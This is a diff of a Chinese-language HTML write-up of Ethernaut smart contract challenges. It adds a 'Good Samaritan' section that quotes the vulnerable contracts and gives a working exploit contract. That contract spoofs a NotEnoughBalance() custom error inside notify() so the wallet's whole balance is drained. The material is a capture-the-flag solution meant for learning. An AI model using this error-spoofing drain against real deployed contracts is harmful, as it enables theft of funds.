@@ -2943,6 +2943,26 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#27-good-samaritan" class="md-nav__link">
+    27. Good Samaritan
+  </a>
+  
+    <nav class="md-nav" aria-label="27. Good Samaritan">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    参考资料
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -3521,6 +3541,26 @@
         
           <li class="md-nav__item">
   <a href="#_17" class="md-nav__link">
+    参考资料
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#27-good-samaritan" class="md-nav__link">
+    27. Good Samaritan
+  </a>
+  
+    <nav class="md-nav" aria-label="27. Good Samaritan">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
     参考资料
   </a>
   
@@ -5756,7 +5796,7 @@ f3  // return
 <span class="p">}</span>
 </code></pre></div>
 <ul>
-<li>传入 <code>CryptoVault.sweepToken()</code> 代币的地址不能等于 <code>underlying</code>，而若传入 <code>LegacyToken</code> 的地址，将调用 <code>delegateTransfer</code>，实际转移的是 <code>CryptoVault</code> 持有的 <code>DET</code> 代币，对应 <code>underlying</code></li>
+<li>传入 <code>CryptoVault.sweepToken()</code> 代币的地址不能等于 <code>underlying</code>，而若传入 <code>LegacyToken</code> 的地址，将调用 <code>delegateTransfer()</code>，实际转移的是 <code>CryptoVault</code> 持有的 <code>DET</code> 代币，对应 <code>underlying</code></li>
 <li>
 <p>若 <code>origSender</code> 为 <code>CryptoVault</code> 的实例则 <code>raiseAlert</code></p>
 <div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">DetectionBot</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">IDetectionBot</span><span class="w"> </span><span class="p">{</span>
@@ -5788,13 +5828,144 @@ f3  // return
 <li><a href="https://github.com/ethereum/solidity/issues/6012">abi.decode cannot decode <code>msg.data</code> · Issue #6012 · ethereum/solidity</a></li>
 <li><a href="https://medium.com/chainsecurity/trueusd-compound-vulnerability-bc5b696d29e2">TrueUSD ↔ Compound Vulnerability | by ChainSecurity | ChainSecurity | Medium</a></li>
 </ul>
+<h2 id="27-good-samaritan">27. Good Samaritan<a class="headerlink" href="#27-good-samaritan" title="Permanent link">&para;</a></h2>
+<p>清空 <code>Good Samaritan</code> 钱包的余额</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">&gt;=</span><span class="mf">0.8.0</span><span class="w"> </span><span class="o">&lt;</span><span class="mf">0.9.0</span><span class="p">;</span>
+
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;openzeppelin-contracts-08/utils/Address.sol&quot;</span><span class="p">;</span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">GoodSamaritan</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">Wallet</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">wallet</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">Coin</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">coin</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">wallet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Wallet</span><span class="p">();</span>
+<span class="w">        </span><span class="nx">coin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Coin</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">wallet</span><span class="p">));</span>
+
+<span class="w">        </span><span class="nx">wallet</span><span class="p">.</span><span class="nx">setCoin</span><span class="p">(</span><span class="nx">coin</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">requestDonation</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">enoughBalance</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// donate 10 coins to requester</span>
+<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="nx">wallet</span><span class="p">.</span><span class="nx">donate10</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">err</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeWithSignature</span><span class="p">(</span><span class="s2">&quot;NotEnoughBalance()&quot;</span><span class="p">))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">err</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="c1">// send the coins left</span>
+<span class="w">                </span><span class="nx">wallet</span><span class="p">.</span><span class="nx">transferRemainder</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>
+<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">Coin</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">using</span><span class="w"> </span><span class="nx">Address</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">address</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">balances</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">error</span><span class="w"> </span><span class="nx">InsufficientBalance</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">current</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">required</span><span class="p">);</span>
+
+<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">wallet_</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// one million coins for Good Samaritan initially</span>
+<span class="w">        </span><span class="nx">balances</span><span class="p">[</span><span class="nx">wallet_</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">10</span><span class="o">**</span><span class="mf">6</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">dest_</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount_</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">currentBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">];</span>
+
+<span class="w">        </span><span class="c1">// transfer only occurs if balance is enough</span>
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="nx">amount_</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="nx">currentBalance</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">amount_</span><span class="p">;</span>
+<span class="w">            </span><span class="nx">balances</span><span class="p">[</span><span class="nx">dest_</span><span class="p">]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">amount_</span><span class="p">;</span>
+
+<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="nx">dest_</span><span class="p">.</span><span class="nx">isContract</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="c1">// notify contract </span>
+<span class="w">                </span><span class="nx">INotifyable</span><span class="p">(</span><span class="nx">dest_</span><span class="p">).</span><span class="nx">notify</span><span class="p">(</span><span class="nx">amount_</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="c1">// a gas-efficient way :)</span>
+<span class="w">            </span><span class="nx">revert</span><span class="w"> </span><span class="nx">InsufficientBalance</span><span class="p">(</span><span class="nx">currentBalance</span><span class="p">,</span><span class="w"> </span><span class="nx">amount_</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">Wallet</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// The owner of the wallet instance</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">Coin</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">coin</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">error</span><span class="w"> </span><span class="nx">OnlyOwner</span><span class="p">();</span>
+<span class="w">    </span><span class="nx">error</span><span class="w"> </span><span class="nx">NotEnoughBalance</span><span class="p">();</span>
+
+<span class="w">    </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">owner</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">revert</span><span class="w"> </span><span class="nx">OnlyOwner</span><span class="p">();</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="nx">_</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">donate10</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">dest_</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// check balance left</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">coin</span><span class="p">.</span><span class="nx">balances</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">10</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">revert</span><span class="w"> </span><span class="nx">NotEnoughBalance</span><span class="p">();</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="c1">// donate 10 coins</span>
+<span class="w">            </span><span class="nx">coin</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">dest_</span><span class="p">,</span><span class="w"> </span><span class="mf">10</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">transferRemainder</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">dest_</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// transfer balance left</span>
+<span class="w">        </span><span class="nx">coin</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">dest_</span><span class="p">,</span><span class="w"> </span><span class="nx">coin</span><span class="p">.</span><span class="nx">balances</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setCoin</span><span class="p">(</span><span class="nx">Coin</span><span class="w"> </span><span class="nx">coin_</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">coin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">coin_</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kr">interface</span><span class="w"> </span><span class="nx">INotifyable</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">notify</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<ul>
+<li>重复调用 <code>requestDonation()</code> 能够清空钱包的余额，但需要耗费大量的汽油 :(</li>
+<li>
+<p>显然，调用 <code>Wallet.transferRemainder()</code> 是清空余额的最佳方法，需要触发错误 <code>NotEnoughBalance()</code>。由于错误能通过调用链传播，根据签名辨识（与函数调用类似），且不包含来源地址，可直接在 <code>notify()</code> 中触发</p>
+<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">Notifyable</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">INotifyable</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">error</span><span class="w"> </span><span class="nx">NotEnoughBalance</span><span class="p">();</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">GoodSamaritan</span><span class="p">(</span><span class="nx">instance</span><span class="p">).</span><span class="nx">requestDonation</span><span class="p">();</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">notify</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 全部 revert 将导致交易失败</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">amount</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">10</span><span class="p">)</span><span class="w"> </span><span class="c1">// 区分 donate10() 和 transferRemainder()</span>
+<span class="w">            </span><span class="nx">revert</span><span class="w"> </span><span class="nx">NotEnoughBalance</span><span class="p">();</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+</ul>
+<h3 id="_18">参考资料<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h3>
+<ul>
+<li><a href="https://blog.soliditylang.org/2021/04/21/custom-errors/">Custom Errors in Solidity | Solidity Blog</a></li>
+</ul>
 
   <hr>
 <div class="md-source-file">
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年3月4日 21:27:06</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年3月5日 11:03:13</span>
       
     
   </small>
